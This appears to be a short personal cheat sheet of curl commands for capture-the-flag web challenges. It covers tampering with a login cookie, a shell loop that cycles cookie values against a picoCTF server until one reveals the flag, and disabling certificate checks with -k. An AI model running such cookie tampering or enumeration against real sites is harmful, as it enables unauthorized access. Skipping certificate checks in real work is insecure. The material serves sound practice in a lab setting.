### Change cookie value
```
curl http://<pageaddress.php> -H "Cookie: login=<value>;"
```
May return deserialization error

### Curl for loop
```
for i in {1..20}; do
for>     contents=$(curl -s http://mercury.picoctf.net:27177/ -H "Cookie: name=$i; Path=/" -L)
for>     if ! echo "$contents" | grep -q "Not very special"; then
for then>         echo "Cookie #$i is special"
for then>         echo $contents | grep "pico"
for then>         break
for then>     fi
for> done
Cookie #18 is special
```

### Curl https
```
curl -k "https://someurl"
```